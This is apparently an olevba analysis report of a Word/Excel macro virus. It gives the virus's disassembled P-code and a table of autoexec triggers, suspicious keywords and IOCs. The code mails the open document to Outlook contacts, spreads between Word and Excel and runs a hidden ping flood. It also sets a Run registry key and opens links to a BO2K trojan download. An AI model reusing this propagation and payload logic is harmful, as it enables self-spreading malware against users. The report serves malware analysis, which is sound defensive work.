' Line #360:
' 	Ld bDoneThat 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld oRecipient 
' 	MemSt TypeOf 
' 	EndIf 
' Line #361:
' 	Ld oRecipient 
' 	ArgsMemCall Resolve 0x0000 
' Line #362:
' 	LitVarSpecial (True)
' 	St bDoneThat 
' Line #363:
' 	StartForVariable 
' 	Ld oContact 
' 	EndForVariable 
' 	NextVar 
' Line #364:
' 	Ld sSubject 
' 	Ld oMessage 
' 	MemSt Subject 
' Line #365:
' 	Ld sBody 
' 	Ld oMessage 
' 	MemSt Body 
' Line #366:
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld oMessage 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #367:
' 	Ld oMessage 
' 	ArgsMemCall Send 0x0000 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	Label skip_outlook 
' Line #370:
' 	EndSub 
' Line #371:
' 	FuncDefn (Private Sub main())
' Line #372:
' 	OnError (Resume Next) 
' Line #373:
' 	ArgsCall Read 0x0000 
' Line #374:
' 	LitDI2 0x0000 
' 	ArgsCall fStealth 0x0001 
' Line #375:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	SelectCase 
' Line #376:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsCall fActiveSpawn 0x0000 
' Line #377:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsCall fDirectorySpawn 0x0000 
' Line #378:
' 	EndSelect 
' Line #379:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld vbCr 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0008 "========"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x001A "Love has torn us apart... "
' 	Concat 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07BC 
' 	Sub 
' 	Paren 
' 	Concat 
' 	LitStr 0x0009 " years..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0008 "========"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #380:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	SelectCase 
' Line #381:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000F "Microsoft Excel"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Excel"
' 	Paren 
' 	ArgsCall fGrabJugular 0x0001 
' 	EndIf 
' Line #382:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Word"
' 	Paren 
' 	ArgsCall fGrabJugular 0x0001 
' 	EndIf 
' Line #383:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Lt 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Eq 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall HaveOutlook 0x0000 
' 	EndIf 
' Line #384:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	SelectCase 
' Line #385:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0013 "ping -t ftp.nai.com"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #386:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0016 "C:\WINDOWS\WINMINE.EXE"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #387:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0021 "explorer http://www.nephilim.com/"
' 	ArgsCall Shell 0x0001 
' Line #388:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x002F "explorer http://www.bo2k.com/warez/bo2k_1.0.exe"
' 	ArgsCall Shell 0x0001 
' Line #389:
' 	EndSelect 
' Line #390:
' 	EndSelect 
' Line #391:
' 	EndSub 
' Line #392:
' 	FuncDefn (Private Sub Document_Close())
' 	BoS 0x0000 
' 	ArgsCall main 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #393:
' 	FuncDefn (Private Sub Workbook_BeforeClose(Cancel As Boolean))
' 	BoS 0x0000 
' 	ArgsCall main 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #394:
' Line #395:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.nephilim.|URL                                          |
|          |com/                |                                             |
|IOC       |http://www.bo2k.com/|URL                                          |
|          |warez/bo2k_1.0.exe  |                                             |
|IOC       |EXCEL.EXE           |Executable file name                         |
|IOC       |WINWORD.EXE         |Executable file name                         |
|IOC       |WINMINE.EXE         |Executable file name                         |
|IOC       |0.exe               |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

